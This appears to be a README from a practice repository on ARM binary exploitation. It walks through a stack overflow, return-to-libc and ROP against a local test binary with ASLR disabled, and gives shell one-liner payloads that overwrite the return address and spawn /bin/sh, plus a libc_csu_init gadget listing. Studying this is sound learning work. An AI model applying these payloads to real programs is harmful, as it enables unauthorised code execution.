# arm_exploit

## Env
see [this](https://blog.csdn.net/u012313335/article/details/53405734) to set up your environment.

## simple stack-overflow
Use pattern.py to get the offset to the return-address.
```
./pattern.py create 30
./pattern.py offset string
```
It's just like the intel assemble, first the return-address(lr register) is pushed into stack, and then 
the frame pointer(r11).
After ensure the offset, overwrite the return-address with donuts' address.
```
./test `python -c "print '1234567890123456\x9c\x04\x01\x00'"`
```

## return to libc
Turn off ASLR and get the address of system. And for some reasons, we don't need to set the argument, because r0 is not changed and we can make it point to a string including '/bin/sh;'. 
```
./test `python -c "print "/bin/sh;##123456\x54\xb1\xe9\x76'"`
```

## ROP
It's kind of like rop in x86_64, you just need to find some gagdets to set arguments: r0, r1, r2, r3. And we also have a powerful gadget in __libc_csu_init:
```
.text:000104F8                 ADD     R4, R4, #1
.text:000104FC                 LDR     R3, [R5],#4
.text:00010500                 MOV     R2, R9
.text:00010504                 MOV     R1, R8
.text:00010508                 MOV     R0, R7
.text:0001050C                 BLX     R3              ; frame_dummy
.text:00010510                 CMP     R6, R4
.text:00010514                 BNE     loc_104F8
.text:00010518                 LDMFD   SP!, {R4-R10,PC}
Surprised? yes, do as you've learned!
```
Just see rop.py.